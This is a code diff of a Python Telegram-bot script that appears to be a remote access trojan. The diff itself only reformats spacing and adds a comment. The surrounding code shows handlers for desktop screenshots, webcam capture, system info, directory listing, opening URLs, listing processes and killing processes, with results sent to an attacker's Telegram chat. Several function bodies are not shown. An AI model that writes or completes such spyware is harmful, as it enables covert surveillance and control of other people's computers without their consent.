@@ -12,13 +12,13 @@ from telebot import util
 from telebot import types
 from subprocess import Popen, PIPE
 
+#Token & ID Chat
+
 token = ''
 id_chat = ''
 
-
 bot = telebot.TeleBot(token, threaded=True)
 bot.worker_pool = util.ThreadPool(num_threads=50)
-
 
 @bot.message_handler(commands=['start', 'Start'])
 def start(commands):
@@ -26,12 +26,10 @@ def start(commands):
 		'\n\nlets have fun  , if you want a command write /help' +
 		'\n\nCoded by Yezz123() | The quieter you become, the more you are able to hear')
 
-
 @bot.message_handler(commands=['help', 'Help'])
 def help(command):
 	bot.send_message(id_chat, 'Commands: \n /Screen🖼 - Desktop ScreenShot \n /Info - Information about computer \n /Open_url🌐 - Open WebSite' +
 		'\n /ls📄 - List dir \n /Kill_process📝 + name process \n /Webcam📸 - Webcam + \n /Tasklist📋 - Process List')
-
 
 @bot.message_handler(commands=['info', 'Info'])
 def info_send(command):
@@ -47,7 +45,6 @@ def info_send(command):
 	except:
 		bot.send_message(id_chat, 'Error')
 
-
 @bot.message_handler(commands=['screen', 'Screen'])
 def send_screen(command):
 	try:
@@ -59,7 +56,6 @@ def send_screen(command):
 	except:
 		bot.send_photo(id_chat, 'Error')
 
-
 @bot.message_handler(commands=['open_url'])
 def open_url(message):
 	user_msg = '{0}'.format(message.text)
@@ -68,7 +64,6 @@ def open_url(message):
 		webbrowser.open_new_tab(url)
 	except:
 		bot.send_message(id_chat, 'Error blyt')
-
 
 @bot.message_handler(commands=['pwd', 'Pwd'])
 def pwd(command):
@@ -84,7 +79,6 @@ def ls_dir(command):
 	except:
 		bot.send_message(id_chat, 'Bla')
 
-
 @bot.message_handler(commands=['kill_process', 'Kill_process'])
 def kill_process(message):
 	try:
@@ -93,7 +87,6 @@ def kill_process(message):
 		bot.send_message(id_chat, 'Good!')
 	except:
 		bot.send_message(id_chat, 'Pizda!')
-
 
 @bot.message_handler(commands=['webcam', 'Webcam'])
 def webcam(command):
@@ -116,7 +109,6 @@ def webcam(command):
 		bot.send_chat_action(id_chat, 'typing')
 		bot.send_message(id_chat, '*Webcam not found*', parse_mode="Markdown")
 
-		
 @bot.message_handler(commands=['tasklist', 'Tasklist'])
 def tasklist(command):
 	try:
@@ -130,6 +122,5 @@ def tasklist(command):
 
 	except:
 		bot.send_message(id_chat, '*Not Found_recheck*', parse_mode="Markdown")
-
 
 bot.polling()
